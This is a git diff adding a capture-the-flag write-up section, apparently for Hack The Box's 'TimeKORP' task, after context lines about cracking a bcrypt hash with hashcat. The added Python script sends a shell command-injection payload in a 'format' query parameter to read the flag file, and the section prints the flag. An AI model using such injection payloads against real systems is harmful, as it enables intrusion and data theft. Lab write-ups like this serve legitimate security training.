@@ -132,3 +132,21 @@ It's a bcrypt hashed password, cracking it with hashcat!
     Hardware.Mon.#1..: Util: 80%
 
 Now we have credentials for admin, login and get the flag!
+
+### Task - TimeKORP
+
+![image](https://github.com/user-attachments/assets/ce4af417-81f3-4f8b-b93f-3913a91b8164)
+
+Solution:
+
+    import requests
+    
+    host, port = 'localhost', 1337
+    HOST = 'http://%s:%s/' % (host, port)
+    
+    r = requests.get(HOST, params={ 'format': "'; cat /flag || '" })
+    print(r.text)
+
+FLAG:
+
+    HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}
